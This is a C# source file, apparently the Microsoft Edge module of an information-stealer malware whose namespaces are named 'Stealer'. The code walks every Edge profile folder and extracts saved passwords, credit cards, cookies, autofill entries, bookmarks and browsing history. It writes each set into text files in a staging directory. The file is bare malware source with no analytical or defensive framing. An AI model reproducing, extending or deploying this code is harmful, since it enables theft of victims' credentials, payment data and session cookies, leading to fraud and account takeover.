using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Edge;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		string path = Paths.lappdata + Paths.EdgePath;
		if (!Directory.Exists(path))
		{
			return;
		}
		string text = sSavePath + "\\Edge";
		Directory.CreateDirectory(text);
		string[] directories = Directory.GetDirectories(path);
		foreach (string text2 in directories)
		{
			if (File.Exists(text2 + "\\Login Data"))
			{
				List<CreditCard> cCC = CreditCards.Get(text2 + "\\Web Data");
				List<AutoFill> aFills = Autofill.Get(text2 + "\\Web Data");
				List<Bookmark> bBookmarks = Bookmarks.Get(text2 + "\\Bookmarks");
				List<Password> pPasswords = Stealer.Chromium.Passwords.Get(text2 + "\\Login Data");
				List<Cookie> cCookies = Cookies.Get(text2 + "\\Cookies");
				List<Site> sHistory = History.Get(text2 + "\\History");
				cBrowserUtils.WriteCreditCards(cCC, text + "\\CreditCards.txt");
				cBrowserUtils.WriteAutoFill(aFills, text + "\\AutoFill.txt");
				cBrowserUtils.WriteBookmarks(bBookmarks, text + "\\Bookmarks.txt");
				cBrowserUtils.WritePasswords(pPasswords, text + "\\Passwords.txt", "Edge_Chromium");
				cBrowserUtils.WriteCookies(cCookies, text + "\\Cookies.txt");
				cBrowserUtils.WriteHistory(sHistory, text + "\\History.txt");
			}
		}
	}
}
